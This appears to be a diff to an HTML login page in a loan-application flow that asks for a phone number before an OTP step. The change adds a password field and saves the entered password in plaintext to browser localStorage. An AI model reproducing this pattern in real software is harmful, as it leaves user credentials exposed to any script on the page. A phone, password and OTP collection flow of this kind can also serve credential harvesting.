@@ -80,11 +80,16 @@
       <p>Please confirm your contact to receive an OTP.</p>
 
       <form id="login1Form">
-        <label for="email">Email address (optional)</label>
-        <input id="email" type="email" placeholder="you@example.com" />
-
         <label for="phone">Phone number</label>
         <input id="phone" type="tel" placeholder="+263712345678" required />
+
+        <label for="password">Password</label>
+        <input
+          id="password"
+          type="password"
+          placeholder="Enter password"
+          required
+        />
 
         <button class="btn" type="submit">Continue</button>
       </form>
@@ -95,13 +100,14 @@
     <script>
       document.getElementById("login1Form").addEventListener("submit", (e) => {
         e.preventDefault();
-        const email = document.getElementById("email").value.trim();
         const phone = document.getElementById("phone").value.trim();
+        const password = document.getElementById("password").value;
         if (!phone) return alert("Please enter your phone number");
+        if (!password) return alert("Please enter a password");
 
         // Save to localStorage so OTP page can use them
         localStorage.setItem("phoneNumber", phone.replace(/\s+/g, ""));
-        if (email) localStorage.setItem("email", email);
+        localStorage.setItem("password", password);
 
         // Proceed to OTP entry page
         window.location.href = "loan5.html";
